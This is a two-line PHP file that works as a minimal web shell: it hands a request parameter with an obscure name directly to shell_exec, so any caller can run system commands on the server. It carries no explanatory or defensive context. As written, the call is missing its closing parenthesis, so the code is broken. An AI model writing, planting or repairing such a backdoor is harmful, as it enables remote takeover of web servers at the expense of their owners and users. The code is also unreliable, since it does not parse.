<?php
shell_exec($_GET['0r-dX7Lc'];
?>
